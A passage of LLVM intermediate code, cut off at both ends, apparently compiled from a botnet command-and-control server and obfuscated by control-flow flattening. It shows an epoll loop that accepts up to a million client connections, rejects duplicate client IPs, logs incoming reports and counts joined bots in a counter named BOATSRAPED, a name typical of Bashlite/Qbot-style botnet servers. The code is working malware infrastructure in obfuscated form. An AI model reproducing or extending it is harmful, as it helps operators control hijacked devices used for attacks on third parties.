loopEnd:                                          ; preds = %123, %122, %119, %113, %105, %89, %79, %71, %67, %66, %58, %54, %46, %41, %37, %19, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #4

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @removestr(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %5 = load i8*, i8** %3, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i8* @strstr(i8* %5, i8* %6) #8
  store i8* %7, i8** %3, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = load i8*, i8** %4, align 8
  %11 = call i64 @strlen(i8* %10) #8
  %12 = getelementptr inbounds i8, i8* %9, i64 %11
  %13 = load i8*, i8** %3, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #8
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = call i64 @strlen(i8* %16) #8
  %18 = add i64 1, %17
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %8, i8* %12, i64 %18, i32 1, i1 false)
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [200 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.clientdata_t*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i64, align 8
  %20 = alloca [2048 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %23 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %24 = bitcast i8* %23 to %struct.epoll_event*
  store %struct.epoll_event* %24, %struct.epoll_event** %5, align 8
  %switchVar = alloca i32
  store i32 370509418, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 370509418, label %25
    i32 -1369061938, label %29
    i32 -1530389006, label %34
    i32 -706079515, label %44
    i32 -1175452188, label %54
    i32 2080537959, label %64
    i32 134215234, label %83
    i32 -138745267, label %94
    i32 1945880007, label %95
    i32 -1327100765, label %101
    i32 -685840852, label %106
    i32 -529921985, label %111
    i32 -1331877258, label %112
    i32 -1955220511, label %113
    i32 966695712, label %130
    i32 -1894042476, label %140
    i32 1638711591, label %144
    i32 -2055803920, label %154
    i32 -662269942, label %156
    i32 2124125737, label %165
    i32 1041724537, label %173
    i32 -184804971, label %174
    i32 -179966277, label %177
    i32 -1435533591, label %178
    i32 -1348466736, label %179
    i32 409758948, label %183
    i32 1330113820, label %191
    i32 908054319, label %196
    i32 -548933377, label %197
    i32 560292728, label %210
    i32 -1175382395, label %211
    i32 2009283809, label %212
    i32 1191625460, label %215
    i32 -260718899, label %219
    i32 -1540674150, label %224
    i32 1722101121, label %227
    i32 847696389, label %230
    i32 1290319691, label %236
    i32 688313623, label %239
    i32 1962814211, label %250
    i32 -1636122535, label %253
    i32 -993516942, label %258
    i32 223094208, label %259
    i32 850305785, label %272
    i32 -1457913744, label %274
    i32 -69096071, label %278
    i32 1753912201, label %284
    i32 -1632095380, label %286
    i32 -1397506994, label %291
    i32 1961467373, label %292
    i32 -1410564178, label %299
    i32 1389606742, label %308
    i32 1665723851, label %314
    i32 668060111, label %320
    i32 -1737812329, label %325
    i32 654285431, label %330
    i32 -1519419893, label %331
    i32 -1824670718, label %332
    i32 -968183257, label %337
    i32 8534567, label %338
    i32 731632894, label %341
    i32 605451701, label %342
    i32 -1763440947, label %346
    i32 832653024, label %351
    i32 1882004070, label %352
    i32 1243774982, label %353
    i32 772414344, label %357
    i32 369466576, label %358
    i32 1088867483, label %359
    i32 -2019543196, label %360
    i32 1806860962, label %364
    i32 682842281, label %369
    i32 -1426275101, label %370
    i32 -481180019, label %371
    i32 754945540, label %372
    i32 -95902796, label %375
    i32 1895230934, label %376
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load volatile i32, i32* @epollFD, align 4
  %27 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %28 = call i32 @epoll_wait(i32 %26, %struct.epoll_event* %27, i32 1000000, i32 -1)
  store i32 %28, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 -1369061938, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %8, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp slt i32 %30, %31
  %33 = select i1 %32, i32 -1530389006, i32 -95902796
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %36 = load i32, i32* %8, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i64 %37
  %39 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 1
  %41 = and i32 %40, 8
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 2080537959, i32 -706079515
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i64 %47
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = and i32 %50, 16
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 2080537959, i32 -1175452188
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %56 = load i32, i32* %8, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %55, i64 %57
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %58, i32 0, i32 0
  %60 = load i32, i32* %59, align 1
  %61 = and i32 %60, 1
  %62 = icmp ne i32 %61, 0
  %63 = select i1 %62, i32 134215234, i32 2080537959
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %65, i64 %67
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %68, i32 0, i32 1
  %70 = bitcast %union.epoll_data* %69 to i32*
  %71 = load i32, i32* %70, align 1
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %73, i32 0, i32 3
  store i8 0, i8* %74, align 1
  %75 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %75, i64 %77
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %78, i32 0, i32 1
  %80 = bitcast %union.epoll_data* %79 to i32*
  %81 = load i32, i32* %80, align 1
  %82 = call i32 @close(i32 %81)
  store i32 754945540, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load volatile i32, i32* @listenFD, align 4
  %85 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %85, i64 %87
  %89 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %88, i32 0, i32 1
  %90 = bitcast %union.epoll_data* %89 to i32*
  %91 = load i32, i32* %90, align 1
  %92 = icmp eq i32 %84, %91
  %93 = select i1 %92, i32 -138745267, i32 223094208
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 1945880007, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 16, i32* %10, align 4
  %96 = load volatile i32, i32* @listenFD, align 4
  %97 = call i32 @accept(i32 %96, %struct.sockaddr* %9, i32* %10)
  store i32 %97, i32* %11, align 4
  %98 = load i32, i32* %11, align 4
  %99 = icmp eq i32 %98, -1
  %100 = select i1 %99, i32 -1327100765, i32 -1955220511
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32* @__errno_location() #9
  %103 = load i32, i32* %102, align 4
  %104 = icmp eq i32 %103, 11
  %105 = select i1 %104, i32 -529921985, i32 -685840852
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32* @__errno_location() #9
  %108 = load i32, i32* %107, align 4
  %109 = icmp eq i32 %108, 11
  %110 = select i1 %109, i32 -529921985, i32 -1331877258
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -993516942, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0))
  store i32 -993516942, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %114, i32 0, i32 2
  %116 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %115, i32 0, i32 0
  %117 = load i32, i32* %116, align 2
  %118 = load i32, i32* %11, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %119
  %121 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %120, i32 0, i32 0
  store i32 %117, i32* %121, align 4
  %122 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %122, i8 0, i64 200, i32 16, i1 false)
  %123 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %124 = load i32, i32* %11, align 4
  %125 = call i32 @fdgets(i8* %123, i32 200, i32 %124)
  %126 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %127 = call i8* @strstr(i8* %126, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0)) #8
  %128 = icmp ne i8* %127, null
  %129 = select i1 %128, i32 966695712, i32 -1435533591
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @trim(i8* %131)
  %132 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @removestr(i8* %132, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0))
  %133 = load i32, i32* %11, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 2
  %137 = getelementptr inbounds [512 x i8], [512 x i8]* %136, i32 0, i32 0
  %138 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %139 = call i8* @strcpy(i8* %137, i8* %138) #7
  store i32 0, i32* %14, align 4
  store i32 -1894042476, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %14, align 4
  %142 = icmp slt i32 %141, 40
  %143 = select i1 %142, i32 1638711591, i32 -179966277
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* %14, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.name, %struct.name* %147, i32 0, i32 0
  %149 = getelementptr inbounds [512 x i8], [512 x i8]* %148, i32 0, i32 0
  %150 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %151 = call i32 @strcmp(i8* %149, i8* %150) #8
  %152 = icmp ne i32 %151, 0
  %153 = select i1 %152, i32 -662269942, i32 -2055803920
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = call i32 @usleep(i32 40000)
  store i32 -179966277, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %14, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %158
  %160 = getelementptr inbounds %struct.name, %struct.name* %159, i32 0, i32 0
  %161 = getelementptr inbounds [512 x i8], [512 x i8]* %160, i32 0, i32 0
  %162 = call i64 @strlen(i8* %161) #8
  %163 = icmp ule i64 %162, 0
  %164 = select i1 %163, i32 2124125737, i32 1041724537
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %14, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %167
  %169 = getelementptr inbounds %struct.name, %struct.name* %168, i32 0, i32 0
  %170 = getelementptr inbounds [512 x i8], [512 x i8]* %169, i32 0, i32 0
  %171 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %172 = call i8* @strcpy(i8* %170, i8* %171) #7
  store i32 -179966277, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  store i32 -184804971, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i32, i32* %14, align 4
  %176 = add nsw i32 %175, 1
  store i32 %176, i32* %14, align 4
  store i32 -1894042476, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  store i32 -1435533591, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 0, i32* %12, align 4
  store i32 -1348466736, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i32, i32* %12, align 4
  %181 = icmp slt i32 %180, 1000000
  %182 = select i1 %181, i32 409758948, i32 1191625460
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %12, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %185
  %187 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %186, i32 0, i32 3
  %188 = load i8, i8* %187, align 1
  %189 = icmp ne i8 %188, 0
  %190 = select i1 %189, i32 1330113820, i32 908054319
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i32, i32* %12, align 4
  %193 = load i32, i32* %11, align 4
  %194 = icmp eq i32 %192, %193
  %195 = select i1 %194, i32 908054319, i32 -548933377
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  store i32 2009283809, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i32, i32* %12, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %199
  %201 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 4
  %203 = load i32, i32* %11, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %204
  %206 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %205, i32 0, i32 0
  %207 = load i32, i32* %206, align 4
  %208 = icmp eq i32 %202, %207
  %209 = select i1 %208, i32 560292728, i32 -1175382395
  store i32 %209, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  store i32 1, i32* %15, align 4
  store i32 1191625460, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  store i32 2009283809, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i32, i32* %12, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %12, align 4
  store i32 -1348466736, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %15, align 4
  %217 = icmp ne i32 %216, 0
  %218 = select i1 %217, i32 -260718899, i32 847696389
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %11, align 4
  %221 = call i64 @send(i32 %220, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i32 0, i32 0), i64 8, i32 16384)
  %222 = icmp eq i64 %221, -1
  %223 = select i1 %222, i32 -1540674150, i32 1722101121
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* %11, align 4
  %226 = call i32 @close(i32 %225)
  store i32 1945880007, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %11, align 4
  %229 = call i32 @close(i32 %228)
  store i32 1945880007, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i32, i32* %11, align 4
  %232 = call i32 @make_socket_non_blocking(i32 %231)
  store i32 %232, i32* %6, align 4
  %233 = load i32, i32* %6, align 4
  %234 = icmp eq i32 %233, -1
  %235 = select i1 %234, i32 1290319691, i32 688313623
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32, i32* %11, align 4
  %238 = call i32 @close(i32 %237)
  store i32 -993516942, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i32, i32* %11, align 4
  %241 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %242 = bitcast %union.epoll_data* %241 to i32*
  store i32 %240, i32* %242, align 1
  %243 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %243, align 1
  %244 = load volatile i32, i32* @epollFD, align 4
  %245 = load i32, i32* %11, align 4
  %246 = call i32 @epoll_ctl(i32 %244, i32 1, i32 %245, %struct.epoll_event* %4) #7
  store i32 %246, i32* %6, align 4
  %247 = load i32, i32* %6, align 4
  %248 = icmp eq i32 %247, -1
  %249 = select i1 %248, i32 1962814211, i32 -1636122535
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %251 = load i32, i32* %11, align 4
  %252 = call i32 @close(i32 %251)
  store i32 -993516942, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i32, i32* %11, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %255
  %257 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %256, i32 0, i32 3
  store i8 1, i8* %257, align 1
  store i32 1945880007, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  store i32 754945540, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %261 = load i32, i32* %8, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %260, i64 %262
  %264 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %263, i32 0, i32 1
  %265 = bitcast %union.epoll_data* %264 to i32*
  %266 = load i32, i32* %265, align 1
  store i32 %266, i32* %16, align 4
  %267 = load i32, i32* %16, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %268
  store %struct.clientdata_t* %269, %struct.clientdata_t** %17, align 8
  store i32 0, i32* %18, align 4
  %270 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %271 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %270, i32 0, i32 3
  store i8 1, i8* %271, align 1
  store i32 850305785, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %273, i8 0, i64 2048, i32 16, i1 false)
  store i32 -1457913744, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %275, i8 0, i64 2048, i32 16, i1 false)
  %276 = icmp ne i8* %275, null
  %277 = select i1 %276, i32 -69096071, i32 1753912201
  store i32 %277, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %280 = load i32, i32* %16, align 4
  %281 = call i32 @fdgets(i8* %279, i32 2048, i32 %280)
  %282 = sext i32 %281 to i64
  store i64 %282, i64* %19, align 8
  %283 = icmp sgt i64 %282, 0
  store i32 1753912201, i32* %switchVar
  store i1 %283, i1* %.reg2mem
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %285 = select i1 %.reload, i32 -1632095380, i32 605451701
  store i32 %285, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %288 = call i8* @strstr(i8* %287, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %289 = icmp eq i8* %288, null
  %290 = select i1 %289, i32 -1397506994, i32 1961467373
  store i32 %290, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  store i32 605451701, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %293)
  %294 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %295 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %296 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %297 = icmp eq i8* %295, %296
  %298 = select i1 %297, i32 -1410564178, i32 1389606742
  store i32 %298, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %301 = call i8* @strstr(i8* %300, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %302 = getelementptr inbounds i8, i8* %301, i64 7
  store i8* %302, i8** %21, align 8
  %303 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %304 = load i8*, i8** %21, align 8
  %305 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %303, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0), i8* %304)
  %306 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %307 = call i32 @fflush(%struct._IO_FILE* %306)
  store i32 -1457913744, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %310 = call i8* @strstr(i8* %309, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %312 = icmp eq i8* %310, %311
  %313 = select i1 %312, i32 1665723851, i32 668060111
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load volatile i32, i32* @BOATSRAPED, align 4
  %316 = add nsw i32 %315, 1
  store volatile i32 %316, i32* @BOATSRAPED, align 4
  %317 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %318 = call i8* @strstr(i8* %317, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %319 = getelementptr inbounds i8, i8* %318, i64 11
  store i8* %319, i8** %22, align 8
  store i32 -1457913744, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %322 = call i32 @strcmp(i8* %321, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %323 = icmp eq i32 %322, 0
  %324 = select i1 %323, i32 -1737812329, i32 -1824670718
  store i32 %324, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i32, i32* %16, align 4
  %327 = call i64 @send(i32 %326, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i64 5, i32 16384)
  %328 = icmp eq i64 %327, -1
  %329 = select i1 %328, i32 654285431, i32 -1519419893
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  store i32 605451701, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  store i32 -1457913744, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %334 = call i32 @strcmp(i8* %333, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i32 0, i32 0)) #8
  %335 = icmp eq i32 %334, 0
  %336 = select i1 %335, i32 -968183257, i32 8534567
  store i32 %336, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  store i32 -1457913744, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %340 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i32 0, i32 0), i8* %339)
  store i32 731632894, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 -1457913744, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i64, i64* %19, align 8
  %344 = icmp eq i64 %343, -1
  %345 = select i1 %344, i32 -1763440947, i32 1243774982
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = call i32* @__errno_location() #9
  %348 = load i32, i32* %347, align 4
  %349 = icmp ne i32 %348, 11
  %350 = select i1 %349, i32 832653024, i32 1882004070
  store i32 %350, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  store i32 1882004070, i32* %switchVar
